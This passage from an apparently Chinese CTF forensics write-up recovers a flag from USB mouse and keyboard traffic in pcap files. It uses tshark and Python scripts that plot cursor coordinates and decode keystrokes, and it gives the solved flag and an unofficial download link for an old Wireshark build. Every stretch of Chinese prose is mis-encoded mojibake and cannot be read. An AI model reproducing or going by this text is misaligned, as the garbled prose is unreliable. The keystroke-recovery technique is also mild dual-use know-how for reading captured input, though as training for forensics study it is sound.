</h3><p>flagéšè—åœ¨usbæµé‡ä¸­ï¼Œé€šè¿‡USBåè®®æ•°æ®ä¸­çš„é¼ æ ‡ç§»åŠ¨è½¨è¿¹è½¬æ¢æˆflag</p><p><strong>é¢˜ç›®</strong><br>æ–¹æ³•1ï¼š<br>åŸºäºpython2çš„UsbMiceHacker.pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰åŸºäºpython3çš„<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHTä»£è¡¨å³é”®</span><br></code></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œä»€ä¹ˆä¹Ÿæ²¡æœ‰<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è´´ä¸Šå…¶ä»–äººæˆåŠŸçš„ç»“æœ<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•2ï¼š<br>æå–é¼ æ ‡æµé‡æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‰”é™¤ç©ºè¡Œï¼Œäº²èº«ç»å†ï¼Œè¿™æ­¥å¾ˆé‡è¦ï¼ŒåŒ…å«ç©ºè¡Œä¼šå¾—åˆ°é”™è¯¯ç»“æœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å†’å·ï¼Œä½¿ç”¨è„šæœ¬æ·»åŠ å†’å·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># é”®ç›˜æµé‡len=16ï¼Œé¼ æ ‡æµé‡len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨mouse.pyè„šæœ¬ï¼Œé€šè¿‡æ›´æ”¹btn_flagçš„å€¼æ¥æµ‹è¯•é¼ æ ‡å·¦å³é”®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 ä»£è¡¨å·¦é”®</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>ç»è¿‡æµ‹è¯•æ˜¯é¼ æ ‡å³é”®æµé‡ï¼Œåœ¨ç”Ÿæˆçš„xy.txtä¸­å¯ä»¥å¾—åˆ°åæ ‡ï¼š<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹äº†<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">å¤§å¸ˆå‚…çš„wp</a>ï¼Œå‘ç°æˆ‘ä»¬æ·»åŠ å†’å·å¾—åˆ°çš„å†…å®¹ä¸ä¸€æ ·</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¤§å¸ˆå‚…ç›´æ¥æå–é¼ æ ‡æµé‡ï¼Œå«æœ‰å†’å·ï¼Œè€Œæˆ‘æå–å‡ºæ¥çš„ä¸å«å†’å·ï¼Œæ˜¯Wiresharkç‰ˆæœ¬ä¸åŒçš„ç¼˜æ•…ï¼Œåœ¨ç½‘ä¸Šæ‰¾åˆ°è€ç‰ˆæœ¬çš„Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>å¯†ç ï¼š5uao<br></code></pre></td></tr></table></figure><p>æå–æµé‡å¾—åˆ°usbdata.txt,åŒ…å«å†’å·ï¼š<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥ä½¿ç”¨ä¸Šé¢çš„mouse.pyè„šæœ¬ï¼Œå³å¯å¾—åˆ°xy.txtã€‚<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥gnuplotå·¥å…·ï¼ŒæŠŠxy.txtæ–‡æœ¬é‡Œçš„åæ ‡è½¬åŒ–ä¸ºå›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¿»è½¬ä¸€ä¸‹å›¾ç‰‡<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨pythonè„šæœ¬ç”»å›¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="é”®ç›˜æµé‡"><a href="#é”®ç›˜æµé‡" class="headerlink" title="é”®ç›˜æµé‡"></a>é”®ç›˜æµé‡</h2><h3 id="åŸºç¡€çŸ¥è¯†-1"><a href="#åŸºç¡€çŸ¥è¯†-1" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>USBåè®®æ•°æ®éƒ¨åˆ†åœ¨Leftover Capture DataåŸŸä¸­ï¼Œæ•°æ®é•¿åº¦ä¸ºå…«ä¸ªå­—èŠ‚ã€‚</p><p>å‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬3ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡å‡»é”®éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ•°æ®åŒ…ã€‚</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">å‚è€ƒæ–‡æ¡£</a>ï¼šUSB keyboardæ˜ å°„è¡¨<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="å®æˆ˜ç»ƒä¹ -1"><a href="#å®æˆ˜ç»ƒä¹ -1" class="headerlink" title="å®æˆ˜ç»ƒä¹ "></a>å®æˆ˜ç»ƒä¹ </h3><p>flagä¿¡æ¯ä¸€èˆ¬éšè—åœ¨USBæµé‡ä¸­ï¼Œé€šè¿‡USBåè®®æ•°æ®ä¸­çš„é”®ç›˜é”®ç è½¬æ¢æˆé”®ä½ã€‚</p><p><strong>é¢˜ç›®1ï¼š</strong><br>åˆ†ææµé‡åŒ…ï¼Œå‘ç°æ•°æ®æ˜¯16ä½ï¼Œæ‰€ä»¥æ˜¯USBé”®ç›˜æµé‡<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>tsharkæå–USBæµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txtæ–‡ä»¶å†…å®¹<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘ç°æå–å‡ºæ¥åŒ…å«ç©ºè¡Œï¼Œä½¿ç”¨å‘½ä»¤å‰”é™¤ç©ºè¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹usbdata.txtç©ºä½™è¡Œæ¶ˆå¤±<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æå–å‡ºæ¥çš„æ•°æ®å¯èƒ½ä¼šå¸¦å†’å·ï¼Œä¹Ÿå¯èƒ½ä¸å¸¦ï¼Œä½†æ˜¯ä¸€èˆ¬çš„è„šæœ¬éƒ½ä¼šæŒ‰ç…§æœ‰å†’å·çš„æ•°æ®æ¥è¯†åˆ«ã€‚æœ‰å†’å·æ—¶æå–æ•°æ®çš„<code>[6:8]</code>ï¼Œæ— å†’å·æ—¶æ•°æ®åœ¨<code>[4:6]</code></p><p>å¯ä»¥åˆ©ç”¨è„šæœ¬åŠ ä¸Šå†’å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># é”®ç›˜æµé‡len=16ï¼Œé¼ æ ‡æµé‡len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸¤ä¸ªé”®ç›˜æµé‡è„šæœ¬</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span 